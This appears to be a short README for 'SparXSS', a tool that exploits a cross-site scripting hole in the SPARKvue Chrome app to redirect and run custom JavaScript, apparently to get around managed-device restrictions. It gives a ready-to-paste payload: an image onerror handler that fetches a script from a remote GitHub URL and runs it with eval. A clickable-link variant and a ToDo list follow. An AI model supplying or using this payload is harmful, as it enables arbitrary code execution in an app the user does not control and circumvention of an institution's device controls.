## A Script For Redirection And Custom Javascript Execution For The SPARKvue Chrome App XSS Vulnerability Found By ohonbob
The full guide to access the vulnerability is in the Titanium Network Discord Server: <a target="_blank" href="http://discord.gg/unblock">discord.gg/unblock</a>

Run it using:
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
```
Or make it a clickable link:
```
<a href="https://amukerd.github.io/SparXSS">Click Me!</a>
```

## [Changelog](https://github.com/Amukerd/SparXSS/blob/main/Changelog.md)

## ToDo
- ~~Make Icon's Show up for Every URL~~
- ~~Make the custom URL's stay when you export the .spklab file~~<br>
- ~~Make the links save without having to manually click the textbox where the script is~~
